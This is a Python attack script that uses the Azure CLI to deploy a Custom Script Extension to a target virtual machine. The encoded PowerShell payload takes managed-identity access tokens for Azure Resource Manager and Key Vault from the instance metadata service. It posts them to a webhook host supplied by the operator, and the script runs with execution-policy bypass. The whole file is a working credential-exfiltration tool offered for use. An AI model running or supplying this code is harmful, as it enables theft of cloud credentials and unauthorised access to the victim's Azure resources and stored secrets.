#!/usr/bin/env python3
# cse_min.py — push Windows Custom Script Extension that posts MSI tokens to a webhook
# Usage:
#   python3 cse_min.py -g <rg> -n <vm> -w https://webhook.site/<id> [--uami <mi_resource_id>] [--dry-run] [--show]

import argparse, base64, json, os, subprocess, sys, tempfile, textwrap

PS_TEMPLATE = r'''$h=@{{Metadata="true"}}
{MI_DEF}
$arm=(Invoke-RestMethod -Headers $h -Uri ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"{ARM_MI})).access_token
$kv =(Invoke-RestMethod -Headers $h -Uri ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"{KV_MI})).access_token
$u="{WEBHOOK}"
$body=("host={{0}}&arm={{1}}&kv={{2}}" -f [uri]::EscapeDataString($env:COMPUTERNAME),[uri]::EscapeDataString($arm),[uri]::EscapeDataString($kv))
Invoke-WebRequest -UseBasicParsing -Method POST -Uri $u -ContentType "application/x-www-form-urlencoded" -Body $body
'''

def build_ps(webhook: str, uami: str | None) -> str:
    if uami:
        mi_def = f'$mi="{uami}"'
        arm_mi = '+\"&mi_res_id=\"+$mi'
        kv_mi  = '+\"&mi_res_id=\"+$mi'
    else:
        mi_def = ''
        arm_mi = ''
        kv_mi  = ''
    return PS_TEMPLATE.format(MI_DEF=mi_def, ARM_MI=arm_mi, KV_MI=kv_mi, WEBHOOK=webhook).strip()

def encode_utf16le_b64(s: str) -> str:
    return base64.b64encode(s.encode('utf-16le')).decode()

def run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, text=True, capture_output=True)

def main():
    ap = argparse.ArgumentParser(description="Push CSE to exfil MSI tokens to a webhook")
    ap.add_argument("-g","--resource-group", required=True)
    ap.add_argument("-n","--vm-name", required=True)
    ap.add_argument("-w","--webhook", required=True)
    ap.add_argument("--uami", help="User-assigned MI resourceId (optional)")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--show", action="store_true", help="Print decoded PS before sending")
    args = ap.parse_args()

    ps = build_ps(args.webhook, args.uami)
    enc = encode_utf16le_b64(ps)
    if len(enc) < 50:
        print("EncodedCommand too short — something went wrong.", file=sys.stderr)
        sys.exit(1)

    if args.show:
        print("---- PowerShell (decoded) ----")
        print(ps)
        print("\n---- EncodedCommand length ----")
        print(len(enc))

    payload = {
        "commandToExecute": f"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {enc}"
    }

    # write protected settings to a temp file
    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".json") as tf:
        json.dump(payload, tf)
        tf.flush()
        json_path = tf.name

    print(f"[+] Generated {json_path} (EncodedCommand len {len(enc)})")

    if args.dry_run:
        print("[i] Dry run: not invoking az")
        print("\naz vm extension set \\")
        print(f"  --resource-group {args.resource_group} \\")
        print(f"  --vm-name {args.vm_name} \\")
        print("  --publisher Microsoft.Compute \\")
        print("  --name CustomScriptExtension \\")
        print("  --version 1.10 \\")
        print("  --settings '{}' \\")
        print(f"  --protected-settings @{json_path}")
        return

    cmd = [
        "az","vm","extension","set",
        "--resource-group", args.resource_group,
        "--vm-name", args.vm_name,
        "--publisher","Microsoft.Compute",
        "--name","CustomScriptExtension",
        "--version","1.10",
        "--settings","{}",
        "--protected-settings", f"@{json_path}",
    ]
    print(f"[+] Invoking CustomScriptExtension on {args.resource_group}/{args.vm_name}")
    res = run(cmd)
    if res.returncode != 0:
        print(res.stdout)
        print(res.stderr, file=sys.stderr)
        sys.exit(res.returncode)
    print(res.stdout.strip())

if __name__ == "__main__":
    main()
